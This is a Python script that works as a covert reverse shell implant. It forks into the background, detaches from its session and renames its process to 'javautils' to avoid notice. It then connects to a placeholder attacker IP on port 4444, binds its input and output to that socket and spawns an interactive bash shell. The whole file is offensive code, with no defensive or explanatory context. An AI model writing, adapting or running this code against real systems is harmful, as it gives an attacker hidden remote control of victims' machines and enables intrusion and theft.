import os
import pty
import socket
import subprocess
import sys

IP = "YOUR_IP_OF_HOST_MACHINE" 
PORT = 4444 

def hide_process():
    try:
        import ctypes
        libc = ctypes.CDLL("libc.so.6")
        libc.prctl(15, b"javautils", 0, 0, 0)  
    except:
        pass

def shell():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((IP, PORT))
        os.dup2(s.fileno(), 0)  
        os.dup2(s.fileno(), 1)  
        os.dup2(s.fileno(), 2)  
        pty.spawn("/bin/bash")  
    except Exception:
        pass

if __name__ == "__main__":
    pid = os.fork()  
    if pid > 0:
        sys.exit()  
    os.setsid()  
    os.umask(0)  
    hide_process()
    shell()

